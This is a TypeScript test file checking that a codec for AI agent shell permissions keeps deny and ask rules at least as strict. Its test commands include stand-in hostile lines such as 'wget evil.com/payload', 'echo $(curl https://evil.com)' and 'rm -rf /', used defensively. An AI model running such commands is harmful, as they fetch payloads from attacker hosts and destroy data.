/** The OMP codec: canonical rules become ordered `bash.patterns`, and none is written weaker. */

import assert from "node:assert/strict";
import { describe, it } from "node:test";

import { CODECS, ompCodec } from "../compat/codecs.ts";
import { UnsupportedCapabilityError } from "../compat/unsupported.ts";
import { evaluate, type PermissionDecision } from "../evaluate.ts";
import { type AgentPermissionPolicy, type Rule } from "../schema.ts";
import { splitShellCommand } from "../shell.ts";

interface OmpPattern {
  match: string;
  approval: "allow" | "prompt" | "deny";
}

function patternsOf(policy: AgentPermissionPolicy): OmpPattern[] {
  const native = ompCodec.encode(policy) as {
    bash?: { patterns: OmpPattern[] };
  };
  return native.bash?.patterns ?? [];
}

/** What OMP does with a command, from its `bash.patterns` implementation: ordered, first match wins. */
function ompDecision(
  patterns: readonly OmpPattern[],
  command: string,
): OmpPattern["approval"] | "unmatched" {
  const normalise = (text: string): string => text.trim().replace(/\s+/gu, " ");
  const regex = (glob: string): RegExp =>
    new RegExp(
      `^${normalise(glob)
        .split("*")
        .map((part) => part.replace(/[\\^$+?.()|[\]{}]/gu, "\\$&"))
        .join(".*")}$`,
      "u",
    );
  const whole = normalise(command);
  const segments = splitShellCommand(command) ?? [];
  const simple = segments.length <= 1;
  for (const { match, approval } of patterns) {
    const re = regex(match);
    if (approval === "allow") {
      if (simple && re.test(whole)) return approval;
    } else if (re.test(whole) || segments.some((s) => re.test(normalise(s)))) {
      return approval;
    }
  }
  return "unmatched";
}

const STRICTNESS = { allow: 0, ask: 1, deny: 2 } as const;
const OMP_STRICTNESS = { unmatched: 0, allow: 0, prompt: 1, deny: 2 } as const;

const commands = [
  "git",
  "git status",
  "git   status",
  "git push origin main",
  "git push",
  "gitk",
  "git status && git push origin",
  "git log | head",
  "curl https://evil.com/x",
  "curl https://good.com/x",
  "wget evil.com/payload",
  "echo evil.com",
  "rm -rf /",
  "rm -rf build",
  "rm file",
  "npm run build",
  "npm run test",
  "npm publish",
  "npm",
  "ls",
  "cat a; rm -rf x",
  "echo $(curl https://evil.com)",
  "sudo ls",
  "deploy",
  "deploy prod",
  "cd /tmp && npm publish",
  "ssh host",
  "",
];

void describe("ompCodec keeps every deny and ask at least as restrictive", () => {
  const policies: [string, Rule[]][] = [
    ["prefix deny", [{ tool: "Bash", pattern: "git push:*", tier: "deny" }]],
    ["prefix ask", [{ tool: "Bash", pattern: "npm publish:*", tier: "ask" }]],
    ["exact deny", [{ tool: "Bash", pattern: "rm -rf /", tier: "deny" }]],
    [
      "trailing wildcard deny",
      [{ tool: "Bash", pattern: "rm -rf *", tier: "deny" }],
    ],
    [
      "bare command wildcard deny",
      [{ tool: "Bash", pattern: "git *", tier: "deny" }],
    ],
    [
      "mid wildcard ask",
      [{ tool: "Bash", pattern: "curl * evil.com*", tier: "ask" }],
    ],
    [
      "domain deny",
      [{ tool: "Bash", pattern: "domain:evil.com", tier: "deny" }],
    ],
    ["bare Bash ask", [{ tool: "Bash", tier: "ask" }]],
    [
      "deny beside a broader allow",
      [
        { tool: "Bash", pattern: "git:*", tier: "allow" },
        { tool: "Bash", pattern: "git push:*", tier: "deny" },
      ],
    ],
    [
      "ask beside a broader allow",
      [
        { tool: "Bash", pattern: "npm:*", tier: "allow" },
        { tool: "Bash", pattern: "npm publish:*", tier: "ask" },
      ],
    ],
  ];

  for (const [name, rules] of policies) {
    void it(name, () => {
      const canonical: AgentPermissionPolicy = {
        defaultMode: "autonomous",
        rules,
      };
      const written = patternsOf(canonical);
      for (const command of commands) {
        const decided: PermissionDecision = evaluate(
          { defaultMode: "autonomous", rules },
          "Bash",
          command,
        );
        if (decided === "allow") continue;
        assert.ok(
          OMP_STRICTNESS[ompDecision(written, command)] >= STRICTNESS[decided],
          `${JSON.stringify(command)}: canonical ${decided}, OMP ${ompDecision(written, command)}`,
        );
      }
    });
  }
});

function refusal(policy: AgentPermissionPolicy): UnsupportedCapabilityError {
  try {
    ompCodec.encode(policy);
  } catch (e) {
    assert.ok(e instanceof UnsupportedCapabilityError, String(e));
    return e;
  }
  throw new assert.AssertionError({ message: "expected a refusal" });
}

void describe("ompCodec default mode", () => {
  void it("lists a refused mode together with refused rules", () => {
    const error = refusal({
      permissions: { defaultMode: "readonly" },
      rules: [{ tool: "Write", tier: "deny" }],
    });
    assert.equal(error.unsupported.length, 1);
    assert.equal(error.settings.length, 1);
    assert.match(error.message, /1 rule\(s\) and 1 setting\(s\)/);
  });
});

void describe("omp as a format", () => {
  void it("is registered", () => {
    assert.ok("omp" in CODECS);
  });
});
